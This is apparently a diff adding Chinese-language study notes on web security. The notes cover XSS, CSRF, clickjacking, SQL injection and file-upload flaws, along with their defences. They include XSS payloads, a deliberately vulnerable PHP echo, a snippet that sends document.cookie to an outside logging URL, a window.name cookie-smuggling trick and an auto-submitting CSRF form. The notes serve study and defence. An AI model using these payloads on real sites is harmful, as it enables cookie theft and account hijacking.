@@ -1,0 +1,142 @@
+# Web安全
+***
+
+## 游览器安全
+* 同源策略
+* 可以跨源的标签:`<script>,<img>,<iframe>,<link>`
+* 受同源策略的限制:`DOM,Cookie,XMLHttpReuest,Flash(会通过对方的crossdomain.xml来判断)`
+* EV SSL证书
+
+## XSS攻击
+* 反射型XSS: 需要用户点击才可发起攻击
+    * 服务端
+    ~~~php
+    <?php
+        $a = $_GET['a'];
+        echo $a;
+    ?>
+    ~~~
+    * 客户端: http://..../?a=(js)
+    * 出现地方: **多出现在搜索的地方**
+* 存储型XSS: 会把用户的输入存储到服务端
+* DOM Based XSS: 通过标签的封闭来注入
+	* 实例
+	~~~html
+    document.getElementById('t').innerHTML = "<a href='"+str+"' >testLink</a>"
+    ...
+    <div id='t'></div>
+    ~~~
+    * 攻击代码
+    ~~~javascript
+    str = '><script>alert(/xss/);</script><'
+    ~~~
+* 窃取Cookie
+~~~javascript
+var img = document.createElement('img');
+img.src = 'http://.../log?coo='+escape(document.cookie);
+document.body.appendChild(img);
+~~~
+* 构造POST和GET请求
+	* GET: `img.src = http://.../?a=123&b=123`
+	* POST:`ajax,jquery`
+* 识别用户游览器：`alert(navigator.userAgent)`
+* 获取用户IP
+* 获取用户的历史
+* XSS平台
+	* Attaack API
+	* BeEF(useful)
+	* XSS-Proxy
+* XSS构造技巧
+	* 利用字符编码: `%c1\`在Unicode下会被当成一个字符，而在utf-8下不会
+	* 绕过长度限制
+		1. 服务端长度限制:对`$var`有长度限制
+		~~~html
+        <input type="text" value="$var">
+        ~~~
+        2. 普通技巧: `"><script>alert(/xss/)</script>`
+        3. 缩短: `"onclick=alert(1)//`
+        4. 或者用`SRC`链接
+	* 使用`<base>`标签：定义页面上所使用“相对路径”的hosting地址，作用与后面的所有标签
+	~~~html
+    <base href="http://127.0.0.1">
+    <img src="a.png"> 
+    <!--src="http://127.0.0.1/a.png"-->
+    ~~~
+	* window.name的妙用
+	~~~javascript
+    /*实现跨域*/
+    window.name = document.cookie;
+    location.href = "http://...../...";
+    ~~~
+    * 重定向的利用：如果A域存在存储型漏洞，B域存在存储型或反射型XSS漏洞，可以从A跳到B，获取URL后跳回A，就达到了跨与攻击的目的。
+* XSS防御
+	* HttpOnly:游览器禁止JS访问带有HttpOnly属性的Cookie
+	~~~php
+    setcookie("name","value",,null,null,null,null,true) //最后一个true代表设置为httpOnly
+    ~~~
+    * 输入检查
+    * 输出检查：`> --> &gt`,对php：htmlspecialchars;对javascript:JavascriptEncode(函数需要自己实现)
+    * 编码：htmlEncode,javascriptEncode,urlEncode
+
+##  CSRF攻击
+* 全称：Cross Site Request Forgery
+* Cookie分为两种：Session Cookie(临时Cookie)，Third-party Cookie(本地Cookie)。
+* 对于不同的游览器，对于第三方Cookie的处理是不一样的。从A域访问B域，IE会拦截第三方Cookie，Firefox,Chrome则不会。
+* P3P头可以实现发送第三方Cookie。
+* POST请求构造技巧
+~~~html
+<iframe>
+    <form action="..." id="p" method="post">
+        <input type="text" name="username" value="aasd"/>
+        <input type="password" name="passwd" vaue=""/>
+        <input type="submit" name="submit" value="submit"/>
+    <script>
+        $("#p").submit();
+        </script>
+    </form>
+</iframe>
+~~~
+
+* CSRF的防御
+	* 添加验证码：给重要操作加上验证码
+	* Referer Check:检查请求是否来自合法的“源”
+	* Anti CSRF Token的使用：Cookie和Form中存token，服务器比对结果。
+
+## ClickJacking(点击劫持)
+* 通过iframe或其他tag设置为透明覆盖在网页功能键上实现点击劫持。
+* Cross Site Image Overlaying(XSIO):他通过控制img的style改变位置，实现劫持。
+* 防御
+	* X-Frame-Options:http头
+		1. DENY: 游览器会拒绝加载任何frame页面
+		2. SAMEORIGIN: frame页面的地址只能为同域名下的页面
+		3. ALLOW-FROM: 定义允许frame加载的页面地址
+
+## Html5安全
+* 新标签的影响：如video允许远程调用视频
+* iframe的sandbox
+* Link Types:noreferrer
+* Canvas标签: 可是用Canvas破解验证码
+* Web Storage: 保存数据
+
+## SQL攻击
+* 关闭错误回显：如果不关闭，如添加"'"会返回敏感信息。
+* 宽字带注入： %5c
+* SQL Column Truncation: sql-mode设置,mysql默认为严格模式。
+* 防御：使用预编译语句，存储过程，检查数据类型，使用安全的函数
+~~~php
+//预编译
+$query = "insert into city values(name,code,dis) values(?,?,?)";
+$stmt = $mysqli->prepare($query);
+$stmt->bind_param("sss",$val1,$val2,$val3);
+$val1 = 'a';
+$val2 = '1';
+$val3 = '123';
+$stmt->execute();
+~~~
+* 其他注入：XML注入，代码注入（如system函数），CRLF注入(\r\n,%0d%0a)
+
+## 文件上传漏洞
+* 漏洞类型：上传Web脚本语言，上传Flash策略文件crossdomain.xml,上传木马文件，上传包含了脚本的图片。
+* 防御最好用白名单形式。（判断文件名后缀和检查文件头）
+* 文件截断：`%00(修改POST数据,对路径而言)`
+* 服务器解析漏洞
